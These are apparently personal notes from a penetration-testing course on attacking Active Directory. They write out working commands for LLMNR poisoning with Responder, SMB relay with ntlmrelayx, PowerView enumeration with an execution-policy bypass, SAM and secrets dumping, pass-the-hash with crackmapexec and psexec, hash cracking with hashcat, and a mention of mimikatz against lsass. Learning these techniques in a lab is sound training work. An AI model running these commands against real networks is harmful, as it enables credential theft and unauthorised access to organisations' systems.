We need to install the inpacket from github

Attack vectors:
LLNMR

responder:
syntax - > responder -I eth0 -rdwv

it will start a listener as a MITM - we want to run it in the morning or after lunch to capture the hashes

Mitigation: disable LMNR -> it is in the AD part of the course

## SMB RELAY
SMB signing must be disable OR NOT REQUIRED

nmap can be used - script -> smb2-security-mode.nse -p445 (SUBNET)

you need to change the /etc/responder/Responder.conf and disable (off) SMB and HTTP

then run the same responder listener - must be listening to continue

used to sniff the SAM database-> ntlmrelayx.py -tf targets.tx (only one IP) -smb2support

## Powerview
used to enumerate AD domain

Need to install it,

powershell -ep bypass

PowerView Cheat Sheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

command: ..\Powerview.ps1

Get_NetDomain = used to get info from the domain controller

Get_NetDomainController = more info

Get-DomainPolicy = used to see the domain policies

(Get-DomainPlicy)."System access"

Get-NetUser = used to get the users

Get-UserProperty

Get-UserProperty -Properties logoncount = to see honeypots

Get-NetComputer

ENUMERATE SMB shares in the Network

Invoke-ShareFinder

## ------------POST COMPROMISE AD
you must have a credential first

shell on the machine

pass the hash / pass the password:

crapmapexec can be used command:

crackmapexec smb 10.0.3.0/24 -u {user} -d {domain MARVEL.local} -p {password}
crackmapexec smb 10.0.3.0/24 -u {user} -H {hash} --local-auth

crackmapexec 10.0.3.0/24 -u {user} -d {domain} -p {password} -- sam = used to dump the sam database

Then we can try psexec.py to get a shell:

psexec.py marvel/fcastle:Password1@{dest ip}

secretsdump.py from kali part of impacket!

secretsdump.py marvel.fcastle:Password1@{target IP}

-we will se SAM hashes

we can take the hashes and compare them between users to check for password reuse

crack with hashcat if not works you can pass the hash

NTLM is module 1000

pass the hash with crackmapexec then psexec for shell

psexec.py "frank castle":@{target ip} -hashes and use both hashes 72498726485f723:64f69fafa55

mantener persistance para el beacon

ejecutar otros procesos

AD DC

intentar obtener un locall admin y tirar miimikatz - lsass sacar hash -

intentar mappear con rusthound

uac elevate tokeen
